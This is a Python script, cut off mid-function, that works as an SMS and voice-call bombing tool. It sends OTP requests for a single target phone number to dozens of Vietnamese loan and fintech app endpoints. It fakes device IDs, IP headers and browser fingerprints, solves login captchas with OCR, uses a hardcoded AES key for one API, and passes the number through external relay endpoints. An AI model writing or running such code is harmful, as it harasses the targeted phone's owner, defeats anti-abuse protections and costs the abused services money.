import sys
import os
#sys.stdout = open(os.devnull, 'w')
#sys.stderr = open(os.devnull, 'w')
import secrets
import sys
import os
import random
import httpx
import asyncio
import time
from curl_cffi.requests import AsyncSession as BrowserSession

_BROWSER = "chrome120"

import gc
import uuid
import hashlib
from datetime import datetime, timedelta
import json
import base64
import io
from typing import Optional, Dict, Tuple
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from PIL import ImageFile, Image
import ddddocr
ImageFile.LOAD_TRUNCATED_IMAGES = True
_ocr = ddddocr.DdddOcr(show_ad=False)

def _random_android_id() -> str:
    return ''.join(random.choices('0123456789abcdef', k=32))

def generate_headers():
    device_id = str(uuid.uuid4()).upper()
    trace_id = uuid.uuid4().hex
    span_id = uuid.uuid4().hex[:16]
    return {
        "Accept": "*/*",
        "Accept-Language": "vi-VN",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "Connection": "keep-alive",
        "User-Agent": "RNClientApp/20260325125922 CFNetwork/1568.200.51 Darwin/24.1.0",
        "x-app-version": "4.39.61",
        "x-platform": "ios",
        "x-device-id": device_id,
        "x-format-money": "json",
        "x-debug-otp": "false",
        "sentry-trace": f"{trace_id}-{span_id}",
        "baggage": (
            "sentry-environment=production,"
            "sentry-release=vn.vuiapp.m%404.39.61%2B20260325125922,"
            "sentry-public_key=2001cef5546e49dc843c73b5edd45a9a,"
            f"sentry-trace_id={trace_id},"
            "sentry-org_id=402372"
        ),
    }
def gen_device_id():
    return str(uuid.uuid4()).upper()


def get_random_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"


def get_random_ipv6():
    parts = []
    for _ in range(8):
        part = format(random.randint(0, 65535), 'x')
        parts.append(part)
    return ':'.join(parts)

def random_ios():
    los = ["14.0", "14.4", "15.0", "15.5", "16.0", "16.4", "17.0"]
    web = random.randint(600, 605)
    sf  = random.randint(14, 17)
    nok = random.choice(los)
    return (
        f"Mozilla/5.0 (iPhone; CPU iPhone OS {nok.replace('.','_')} like Mac OS X) "
        f"AppleWebKit/{web}.1 (KHTML, like Gecko) Version/{sf}.0 Mobile/15E148 Safari/{web}.1"
    )

def build_headers(call_origin: str):
    origin = call_origin.rstrip("/")
    return {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "sec-ch-ua": '"Google Chrome";v="120", "Chromium";v="120", "Not-A.Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "x-client-type": "phone",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
        "Origin": origin,
        "Referer": origin + "/",
        "Content-Type": "application/json",
        "Connection": "keep-alive",
        "X-Device-Id": str(uuid.uuid4()),
    }


_VNCREDIT_KEY = b'tdbdif7653scbvy4'

def _vncredit_encrypt(data: dict) -> dict:
    raw = json.dumps(data, separators=(',', ':')).encode()
    cipher = AES.new(_VNCREDIT_KEY, AES.MODE_ECB)
    enc = base64.b64encode(cipher.encrypt(pad(raw, 16))).decode()
    return {"JXTbpertIbc": enc}

def _vncredit_decrypt(resp_json: dict) -> dict:
    try:
        enc = resp_json.get("JXTbpertIbc", "")
        raw = base64.b64decode(enc)
        cipher = AES.new(_VNCREDIT_KEY, AES.MODE_ECB)
        return json.loads(unpad(cipher.decrypt(raw), 16).decode())
    except Exception:
        return resp_json

_VNCREDIT_DEVICE_IDS: dict = {}

def _vncredit_device_id(phone_otp: str) -> str:
    if phone_otp not in _VNCREDIT_DEVICE_IDS:
        _VNCREDIT_DEVICE_IDS[phone_otp] = str(random.randint(10000000, 99999999))
    return _VNCREDIT_DEVICE_IDS[phone_otp]

_QQ_BASE      = "https://ang.quickquangapp.com"
_QQ_OWNERSHIP = "quiquang_ios"

def _qq_headers() -> dict:
    return {
        "Content-Type":  "application/json",
        "Accept":        "application/json, text/plain, */*",
        "encrypted":     "0",
        "encryptType":   "0",
        "disturbedUrl":  "1",
        "disturbedPar":  "1",
        "ownerShip":     _QQ_OWNERSHIP,
        "Origin":        _QQ_BASE,
        "Referer":       _QQ_BASE + "/",
        "User-Agent":    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
                         "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    }

def _qq_body(phone_otp: str, extra: dict) -> dict:
    return {
        "i18n":            "vi_VN",
        "reqSource":       "Ios",
        "phoneName":       "iPhone13,3",
        "appVersion":      "1.1.0",
        "androidversion":  "iOS18.1",
        "webVersion":      "1.0.0",
        "deviceID":        str(uuid.uuid4()).upper(),
        "uuid":            uuid.uuid4().hex,
        "pagingData":      0,
        "exquisiteItemType": 1,
        "ownerShip":       _QQ_OWNERSHIP,
        "token":           "",
        **extra,
    }

def _qq_solve(b64_str: str) -> str:
    try:
        raw = base64.b64decode(b64_str)
        img = Image.open(io.BytesIO(raw))
        img.load()
        buf_color = io.BytesIO()
        img.convert("RGB").save(buf_color, format="PNG")
        result = _ocr.classification(buf_color.getvalue())
        if result and result.strip():
            return result.strip()
        from PIL import ImageEnhance
        enhanced = ImageEnhance.Contrast(img.convert("RGB")).enhance(2.0)
        buf_enh = io.BytesIO()
        enhanced.save(buf_enh, format="PNG")
        result2 = _ocr.classification(buf_enh.getvalue())
        return result2.strip() if result2 else ""
    except Exception:
        return ""

async def _qq_send(phone_otp: str, endpoint: str, label: str):
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as c:
            r1 = await c.post(
                f"{_QQ_BASE}{endpoint}",
                headers=_qq_headers(),
                json=_qq_body(phone_otp, {"phoneNo": phone_otp, "veriType": "LOGIN", "figureVeri": False}),
            )
            d1 = r1.json()
            if str(d1.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp}  {d1.get('message','')}")
                return
            cap_b64 = (d1.get("data") or {}).get("captcha", "")
            if not cap_b64:
                print(f" ✗ {label} {phone_otp}  code={d1.get('code')}  {d1.get('message','')}")
                return
            answer = _qq_solve(cap_b64)
            if not answer:
                print(f" ✗ {label} {phone_otp}  OCR failed")
                return
            r2 = await c.post(
                f"{_QQ_BASE}{endpoint}",
                headers=_qq_headers(),
                json=_qq_body(phone_otp, {"phoneNo": phone_otp, "veriType": "LOGIN", "figureVeri": answer}),
            )
            d2 = r2.json()
            ok = str(d2.get("code", "")) == "0"
            print(f" {'✅' if ok else '✗'} {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
    except Exception as e:
        print(f" ✗ {label} ERR: {str(e)[:60]}")

async def qq_sms(phone_otp: str):
    await _qq_send(phone_otp, "/base/xmh/getSMSCode", "QQ SMS")

async def qq_voice(phone_otp: str):
    await _qq_send(phone_otp, "/base/xmh/getVoiceCode", "QQ Voice")

_PTV_BASE      = "https://app.phuthinhvay.com"
_PTV_OWNERSHIP = "PTVayNhanh_ios"

def _ptv_headers() -> dict:
    return {
        "Content-Type":  "application/json",
        "Accept":        "application/json, text/plain, */*",
        "encrypted":     "0",
        "encrypttype":   "0",
        "disturbedurl":  "0",
        "disturbedpar":  "0",
        "ownership":     _PTV_OWNERSHIP,
        "User-Agent":    "WorkHome/20 CFNetwork/1568.200.51 Darwin/24.1.0",
    }

def _ptv_body(phone_otp: str, extra: dict) -> dict:
    return {
        "i18n":        "vi_VN",
        "reqSource":   "Ios",
        "phoneName":   "iPhone13,3",
        "appVersion":  "1.1.0",
        "ownerShip":   _PTV_OWNERSHIP,
        "veriType":    "LOGIN",
        "figureVeri":  False,
        "phoneNo":     phone_otp,
        **extra,
    }

async def _ptv_send(phone_otp: str, endpoint: str, cap_key: str, label: str):
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as c:
            r1 = await c.post(
                f"{_PTV_BASE}{endpoint}",
                headers=_ptv_headers(),
                json=_ptv_body(phone_otp, {}),
            )
            d1 = r1.json()
            if str(d1.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp}  {d1.get('message','')}")
                return
            cap_b64 = (d1.get("data") or {}).get(cap_key, "")
            if not cap_b64:
                print(f" ✗ {label} {phone_otp}  code={d1.get('code')}  {d1.get('message','')}")
                return
            answer = _qq_solve(cap_b64)
            if not answer:
                print(f" ✗ {label} {phone_otp}  OCR failed")
                return
            r2 = await c.post(
                f"{_PTV_BASE}{endpoint}",
                headers=_ptv_headers(),
                json=_ptv_body(phone_otp, {"figureVeri": answer}),
            )
            d2 = r2.json()
            ok = str(d2.get("code", "")) == "0"
            print(f" {'✅' if ok else '✗'} {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
    except Exception as e:
        print(f" ✗ {label} ERR: {str(e)[:60]}")

async def ptvay_sms(phone_otp: str):
    await _ptv_send(phone_otp, "/lvjKRH/brRsY/JHkuyNids/RlhiPz", "jmJiSn2D1", "PTVay SMS")

async def ptvay_voice(phone_otp: str):
    await _ptv_send(phone_otp, "/lvjKRH/brRsY/getVoiceCode", "captcha", "PTVay Voice")

_LAVI_BASE      = "http://tin.lavifinancecompany.com"
_LAVI_OWNERSHIP = "laviFinance_ios"

def _lavi_headers() -> dict:
    return {
        "Content-Type":  "application/json",
        "Accept":        "application/json, text/plain, */*",
        "encrypted":     "0",
        "encryptType":   "0",
        "ownerShip":     _LAVI_OWNERSHIP,
        "User-Agent":    "laviFinance/1 CFNetwork/1568.200.51 Darwin/24.1.0",
    }

def _lavi_body(phone_otp: str, extra: dict) -> dict:
    return {
        "i18n":        "vi_VN",
        "reqSource":   "Ios",
        "phoneName":   "iPhone13,3",
        "appVersion":  "1.1.0",
        "ownerShip":   _LAVI_OWNERSHIP,
        "phoneNo":     phone_otp,
        "veriType":    "LOGIN",
        "figureVeri":  False,
        **extra,
    }

async def _lavi_send(phone_otp: str, endpoint: str, label: str):
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as c:
            r1 = await c.post(
                f"{_LAVI_BASE}{endpoint}",
                headers=_lavi_headers(),
                json=_lavi_body(phone_otp, {}),
            )
            d1 = r1.json()
            if str(d1.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp}  {d1.get('message','')}")
                return
            cap_b64 = (d1.get("data") or {}).get("captcha", "")
            if not cap_b64:
                print(f" ✗ {label} {phone_otp}  code={d1.get('code')}  {d1.get('message','')}")
                return
            answer = _qq_solve(cap_b64)
            if not answer:
                print(f" ✗ {label} {phone_otp}  OCR failed")
                return
            r2 = await c.post(
                f"{_LAVI_BASE}{endpoint}",
                headers=_lavi_headers(),
                json=_lavi_body(phone_otp, {"figureVeri": answer}),
            )
            d2 = r2.json()
            ok = str(d2.get("code", "")) == "0"
            print(f" {'✅' if ok else '✗'} {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
    except Exception as e:
        print(f" ✗ {label} ERR: {str(e)[:60]}")

async def lavi_sms(phone_otp: str):
    await _lavi_send(phone_otp, "/base/xmh/getSMSCode", "Lavi SMS")

async def lavi_voice(phone_otp: str):
    await _lavi_send(phone_otp, "/base/xmh/getVoiceCode", "Lavi Voice")

_ACHAU_BASE      = "https://tien.achauloan.com"
_ACHAU_OWNERSHIP = "AChauLoan_ios"

def _achau_headers() -> dict:
    return {
        "Accept":          "*/*",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type":    "application/json",
        "Connection":      "keep-alive",
        "User-Agent":      "vetnam_xingxing_01/5 CFNetwork/1568.200.51 Darwin/24.1.0",
        "disturbedurl":    "0",
        "encrypttype":     "1",
        "encrypted":       "0",
        "disturbedpar":    "1",
        "ownership":       _ACHAU_OWNERSHIP,
    }

def _achau_body(phone_otp: str, extra: dict) -> dict:
    return {
        "reqSource":      "Ios",
        "phoneName":      "iPhone",
        "appVersion":     "1.2.8",
        "androidversion": "iOS 18.1",
        "deviceID":       str(uuid.uuid4()).upper(),
        "i18n":           "zh_CN",
        "phoneNo":        phone_otp,
        "veriType":       "LOGIN",
        **extra,
    }

async def _achau_send(phone_otp: str, endpoint: str, label: str):
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as c:
            r = await c.post(
                f"{_ACHAU_BASE}{endpoint}",
                headers=_achau_headers(),
                json=_achau_body(phone_otp, {}),
            )
            d = r.json()
            ok = str(d.get("code", "")) == "0"
            print(f" {'✅' if ok else '✗'} {label} {phone_otp}  {d.get('message', '')}")
    except Exception as e:
        print(f" ✗ {label} ERR: {str(e)[:60]}")

async def achau_sms(phone_otp: str):
    await _achau_send(phone_otp, "/AQadQ/Jfmb/goMXd/IuGP", "AChauLoan SMS")

_PETRO_BASE      = "https://loan.gpamcloan.com"
_PETRO_OWNERSHIP = "GPAMCloan_ios"

def _petro_headers() -> dict:
    return {
        "Content-Type":  "application/json",
        "Accept":        "application/json, text/plain, */*",
        "encrypted":     "0",
        "encryptType":   "0",
        "disturbedUrl":  "1",
        "disturbedPar":  "1",
        "ownerShip":     _PETRO_OWNERSHIP,
        "Origin":        _PETRO_BASE,
        "Referer":       _PETRO_BASE + "/",
        "User-Agent":    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
                         "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    }

def _petro_body(phone_otp: str, extra: dict) -> dict:
    return {
        "i18n":              "vi_VN",
        "reqSource":         "Ios",
        "phoneName":         "iPhone13,3",
        "appVersion":        "1.1.0",
        "androidversion":    "iOS18.1",
        "webVersion":        "1.0.0",
        "deviceID":          str(uuid.uuid4()).upper(),
        "uuid":              uuid.uuid4().hex,
        "pagingData":        0,
        "phoneNo":           phone_otp,
        "exquisiteItemType": 1,
        "ownerShip":         _PETRO_OWNERSHIP,
        "token":             "",
        **extra,
    }

async def _petro_send(phone_otp: str, endpoint: str, label: str):
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as c:
            r1 = await c.post(
                f"{_PETRO_BASE}{endpoint}",
                headers=_petro_headers(),
                json=_petro_body(phone_otp, {"veriType": "LOGIN", "figureVeri": False}),
            )
            d1 = r1.json()
            if str(d1.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp}  {d1.get('message','')}")
                return
            cap_b64 = (d1.get("data") or {}).get("captcha", "")
            if not cap_b64:
                print(f" ✗ {label} {phone_otp}  code={d1.get('code')}  {d1.get('message','')}")
                return
            answer = _qq_solve(cap_b64)
            if not answer:
                print(f" ✗ {label} {phone_otp}  OCR failed")
                return
            r2 = await c.post(
                f"{_PETRO_BASE}{endpoint}",
                headers=_petro_headers(),
                json=_petro_body(phone_otp, {"veriType": "LOGIN", "figureVeri": answer}),
            )
            d2 = r2.json()
            ok = str(d2.get("code", "")) == "0"
            print(f" {'✅' if ok else '✗'} {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
    except Exception as e:
        print(f" ✗ {label} ERR: {str(e)[:60]}")

async def petro_sms(phone_otp: str):
    await _petro_send(phone_otp, "/base/xmh/getSMSCode", "Petro SMS")

async def petro_voice(phone_otp: str):
    await _petro_send(phone_otp, "/base/xmh/getVoiceCode", "Petro Voice")

def _vncredit_headers(phone_otp: str) -> dict:
    return {
        "Content-Type": "application/json",
        "arHZCqdXMe": "",
        "DJDVItHEOpT": "",
        "TcJSztVvHI": "in",
        "vMdkYlySgyVn": "cn.ivay.h5.viet",
        "BCCpGTCULBU": _vncredit_device_id(phone_otp),
        "xAfAyxfEVv": "",
        "oqBfkSWOjSw": "1",
        "fbcId": "",
        "User-Agent": (
            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1"
        ),
    }


async def vncredit_sms(phone_otp):
    try:
        headers = _vncredit_headers(phone_otp)
        async with BrowserSession(impersonate=_BROWSER) as client:
            r = await client.post(
                "https://api.tmdv.vn/mkydnfCwIW/GOifgUPDRz",
                json={"mobile": phone_otp, "type": "1"}, headers=headers, timeout=20,
            )
        if r.status_code == 200:
            resp = _vncredit_decrypt(r.json())
            ok = resp.get("code") == 0
            print(f" {'✅' if ok else '✗'} VNCredit SMS  {resp.get('msg', '')}")
            return ok
        print(f" ✗ VNCredit SMS HTTP {r.status_code}")
        return False
    except Exception as e:
        print(f" ✗ VNCredit SMS ERR: {str(e)[:60]}")
        return False

async def vncredit_voice(phone_otp):
    try:
        headers = _vncredit_headers(phone_otp)
        async with BrowserSession(impersonate=_BROWSER) as client:
            r = await client.post(
                "https://api.tmdv.vn/mkydnfCwIW/vCqfJYeweB",
                json={"mobile": phone_otp, "type": "1"}, headers=headers, timeout=20,
            )
        if r.status_code == 200:
            resp = _vncredit_decrypt(r.json())
            ok = resp.get("code") == 0
            print(f" {'✅' if ok else '✗'} VNCredit Voice  {resp.get('msg', '')}")
            return ok
        print(f" ✗ VNCredit Voice HTTP {r.status_code}")
        return False
    except Exception as e:
        print(f" ✗ VNCredit Voice ERR: {str(e)[:60]}")
        return False

async def random_site(phone_otp):
    async with httpx.AsyncClient(timeout=10) as client:
        r = await client.post(
            "https://doaxa--e3c9c6644c9c11f1b16dee650bb23af1.web.val.run",
            headers={"Content-Type": "application/json"},
            json={"phone": phone_otp}
        )
    print(r.status_code)
async def call_mfast360(phone_otp):
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    }
    payload = {
        "mobile_phone": phone_otp,
        "type": "call",
    }
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            r = await client.post(
                "https://asia-south1-mfast-360-prod.cloudfunctions.net/api/auth/sendOtp",
                json=payload,
                headers=headers,
            )
        print(f" Status: {r.status_code} | call ")
    except:
        pass

async def calll20(phone_otp):
    headers = build_headers("https://vn-ios-h5-artemisdongapp-com.pages.dev")
    payload = {
       "country_code": "vn",
       "phone": phone_otp,
       "app_name": "Artemis Dong",
       "app_package_name": "com.artmis.dong.vn",
       "platform": "ios",
       "app_id": "264000001",
    }
    async with httpx.AsyncClient(timeout=10) as client:
        res1 = await client.post(
            "https://advii.artemisdongapp.com/v2/login/captcha",
            json={**payload, "type": 1},
            headers=headers
            )
        print(f" Status: {res1.status_code} Thành Công Lần 1")

        res2 = await client.post(
                "https://advii.artemisdongapp.com/v2/login/captcha",
                json={**payload, "type": 2},
                headers=headers

               )
        print(f" Status: {res2.status_code} | call20 ")

async def call2(phone_otp):
    try:
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=utf-8",
            "Origin": "https://vaycash.top",
            "Referer": "https://vaycash.top/",
            "language": "vi_VN",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
            "Accept-Language": "vi-VN,vi;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
        }
        payload_1 = {
            "smsType": "1",
            "phone": phone_otp,
            "loanProductName": "u_cash"
        }
        async with BrowserSession(impersonate=_BROWSER) as client:
            r1 = await client.post(
                "https://vaycash.top/app-domain/api/user/sentSms",
                headers=headers,
                json=payload_1
            )
            print("Call2:", r1.status_code)
            print("Call2:", r1.text)
            payload_2 = {
                "type": 2,
                "productName": "u_cash"
            }
            r2 = await client.post(
                "https://vaycash.top/app-domain/api/user/appCollectUpload",
                headers=headers,
                json=payload_2
            )
            print("Call2:", r2.status_code)
        return True
    except:
        return False

async def call1(phone_otp):
    try:
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=utf-8",
            "Origin": "https://ezvay.com",
            "Referer": "https://ezvay.com/",
            "language": "vi_VN",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
            "Accept-Language": "vi-VN,vi;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
        }
        payload_1 = {
            "smsType": "1",
            "phone": phone_otp,
            "loanProductName": "vay_home"
        }
        async with BrowserSession(impersonate=_BROWSER) as client:
            r1 = await client.post(
                "https://ezvay.com/app-domain/api/user/sentSms",
                headers=headers,
                json=payload_1
            )
            print("Call1:", r1.status_code)
            print("Call1:", r1.text)
            payload_2 = {
                "type": 2,
                "productName": "vay_home"
            }
            r2 = await client.post(
                "https://ezvay.com/app-domain/api/user/appCollectUpload",
                headers=headers,
                json=payload_2
            )
            print("Call1:", r2.status_code)
        return True
    except:
        return False

async def vuiap(phone_otp, proxy_url):
    headers = generate_headers()
    url     = "https://api-vncdn.t.vuiapp.vn/graphql"
    payload = {
        "query": "mutation requestLogin($payload: RequestLoginPayload!) {\n  requestLogin(payload: $payload) {\n    isNew\n    token\n    debug_otp\n    __typename\n  }\n}\n",
        "variables": {
            "payload": {
                "confirmSharingInformation": True,
                "otpLength": 6,
                "phoneNumber": phone_otp
            }
        },
        "operationName": "requestLogin"
    }
    try:
        async with httpx.AsyncClient(http2=False, proxy=proxy_url, verify=False, timeout=httpx.Timeout(10, connect=5)) as client:
            r = await client.post(url, headers=headers, json=payload)
        if r.status_code == 200:
            return True, proxy_url, "OK"
        return False, proxy_url, f"HTTP {r.status_code}"
    except:
        return False, proxy_url, "Failed"


async def vuiapp(phone_otp, proxy_url):
    headers = generate_headers()
    url     = "https://api-vncdn.vuiapp.vn/graphql"
    payload = {
        "query": "mutation resendAuthenticationOTP($payload: RequestResendOtpPayload!) {\n  requestResendOtp(payload: $payload) {\n    otp {\n      success\n      debug_otp\n      retryAfter\n      __typename\n    }\n    debug_otp\n    __typename\n  }\n}\n",
        "variables": {
            "payload": {
                "otpMethod": "Voice",
                "otpLength": 6,
                "phoneNumber": phone_otp
            }
        },
        "operationName": "resendAuthenticationOTP"
    }
    try:
        async with httpx.AsyncClient(http2=False, proxy=proxy_url, verify=False, timeout=httpx.Timeout(10, connect=5)) as client:
            r = await client.post(url, headers=headers, json=payload)
        if r.status_code == 200:
            return True, proxy_url, "OK"
        return False, proxy_url, f"HTTP {r.status_code}"
    except:
        return False, proxy_url, "Failed"


async def vuiapp1(phone_otp, proxy_url):
    headers = generate_headers()
    url = "https://api-vncdn.vuiapp.vn/graphql"
    phone_fmt = phone_otp if phone_otp.startswith("+") else f"+84{phone_otp.lstrip('0')}"
    payload = {
        "operationName": "requestChangePassword",
        "variables": {"phoneNumber": phone_fmt, "otpLength": 6},
        "query": (
            "mutation requestChangePassword($phoneNumber: PhoneNumber!, $otpLength: Int) {\n"
            "  requestChangePassword(phoneNumber: $phoneNumber, otpLength: $otpLength) {\n"
            "    requestId\n    otp { success retryAfter __typename }\n    __typename\n  }\n}\n"
        ),
    }
    try:
        async with httpx.AsyncClient(http2=False, proxy=proxy_url, verify=False, timeout=httpx.Timeout(10, connect=5)) as client:
            r = await client.post(url, headers=headers, json=payload)
        if r.status_code == 200:
            return True, proxy_url, "OK"
        return False, proxy_url, f"HTTP {r.status_code}"
    except:
        return False, proxy_url, "Failed"


async def vuiapp2(phone_otp, proxy_url):
    headers = generate_headers()
    url = "https://api-vncdn.vuiapp.vn/graphql"
    phone_fmt = phone_otp if phone_otp.startswith("+") else f"+84{phone_otp.lstrip('0')}"
    payload = {
        "query": "mutation resendAuthenticationOTP($payload: RequestResendOtpPayload!) {\n  requestResendOtp(payload: $payload) {\n    otp {\n      success\n      debug_otp\n      retryAfter\n      __typename\n    }\n    debug_otp\n    __typename\n  }\n}\n",
        "variables": {
            "payload": {
                "otpMethod": "Voice",
                "otpLength": 6,
                "phoneNumber": phone_fmt
            }
        },
        "operationName": "resendAuthenticationOTP"
    }
    try:
        async with httpx.AsyncClient(http2=False, proxy=proxy_url, verify=False, timeout=httpx.Timeout(10, connect=5)) as client:
            r = await client.post(url, headers=headers, json=payload)
        if r.status_code == 200:
            return True, proxy_url, "OK"
        return False, proxy_url, f"HTTP {r.status_code}"
    except:
        return False, proxy_url, "Failed"


async def mfast1(phone_otp):
    if phone_otp.startswith("0"):
        phone_otp = "84" + phone_otp[1:]
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://mfast.vn",
        "Referer": "https://mfast.vn/",
        "language": "vi_VN",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        "X-Requested-With": "XMLHttpRequest",
    }
    data = {
        "phone": phone_otp,
        "type": "phone",
    }
    async with httpx.AsyncClient(timeout=10) as client:
        r = await client.post(
            "https://appay.cloudcms.vn/mfast/potential_customer/ajax_confirm_phone",
            headers=headers,
            data=data,
        )
    print(r.status_code)

async def combo1(phone_otp):
    headers = build_headers("https://ios-h5.sunmobilefinance.com")
    payload1 = {
        "app_name": "Sun Mobile",
        "packagename": "sunvay.online.vn",
        "phone": phone_otp,
        "type": 2,
        "platform": "ios",
        "app_id": "238000001",
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        r1 = await client.post(
            "https://sciiv.sunmobilefinance.com/v2/login/captcha",
            json=payload1,
            headers=headers
        )
    print("r1 status:", r1.status_code)

async def combo2(phone_otp):
    headers = build_headers("https://ios-h5.sunmobilefinance.com")
    payload = {
        "app_name": "Sun Mobile",
        "packagename": "sunvay.online.vn",
        "phone": phone_otp,
        "type": 2,
        "platform": "android",
        "app_id": "238000000",
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        r2 = await client.post(
            "https://scaiv.sunmobilefinance.com/v2/login/captcha",
            headers=headers,
            json=payload
        )
    print("r2 status:", r2.status_code)

async def mfast(phone_otp):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://mfast.vn",
        "Referer": "https://mfast.vn/",
        "language": "vi_VN",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        "X-Requested-With": "XMLHttpRequest",
    }
    data = {
        "phone": phone_otp,
        "type": "phone",
    }
    async with httpx.AsyncClient(timeout=10) as client:
        r = await client.post(
            "https://appay.cloudcms.vn/mfast/potential_customer/ajax_confirm_phone",
            headers=headers,
            data=data,
        )
    print(r.status_code)
    print(r.text)

VAY_DEP365 = [
        "https://ndnndfndndbb--28fa0824520211f1b766ee650bb23af1.web.val.run",
        "https://wander6fb5.xadoa8.workers.dev/vaydep365",
        "https://verceldeploy-one-phi.vercel.app/api/vaydep",        
    ]

async def call_vaydep365(phone_otp: str):    
    try:    
        async with httpx.AsyncClient(timeout=10) as client:    
            r = await client.post(
                random.choice(VAY_DEP365),
                json={"phone": phone_otp},
                timeout=20
            )
        print(f"  vaydep365_valtown | {r.status_code} | {r.text[:200]}")
        return r.json()
    except Exception as e:
        print(f"  vaydep365_valtown | lỗi: {e}")
        return None


async def call8(phone_otp):
    headers = build_headers("https://ios-h5.marttimeassrt.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Mar Vay",
        "app_package_name": "com.maritme.assrt.vn",
        "platform": "android",
        "app_id": "266000001",
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res1 = await client.post(
            "https://mvvii.marttimeassrt.com/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers,
        )
    print(f" Status: {res1.status_code} | call")

async def call3(phone_otp):
    phone_formatted = phone_otp.lstrip('0')
    url = "https://api.hicash.fun/v1/login/send/msm"
    headers = {
        "Host": "api.hicash.fun",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://h5.hicash.fun",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        "Referer": "https://h5.hicash.fun/",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Priority": "u=3, i",
    }
    data = {
        "phone": phone_formatted,
        "type": "2",
        "chntoken": "",
        "sourse": "1",
        "ip2": get_random_ip(),
        "ip3": get_random_ipv6(),
    }
    try:
        async with BrowserSession(impersonate=_BROWSER) as client:
            response = await client.post(url, headers=headers, data=data)
        print(f"📡 Status: {response.status_code}")
        return False, response.text
    except:
        return False


async def call9(phone_otp):
    cookies = {
        "__sbref": "hgpyjywadlykgkoiavkyouqetxuxcpwhpxdqandf",
        "_cabinet_key": "SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDkxNDkwMTk2Ng.nD_8NLs-CZ7IqIV4JqSpmnAsPVAC0r0WuzMgua9OO1U",
    }
    headers_get = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "referer": "https://vayxanh.com/",
    }
    headers_post = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json;charset=utf-8",
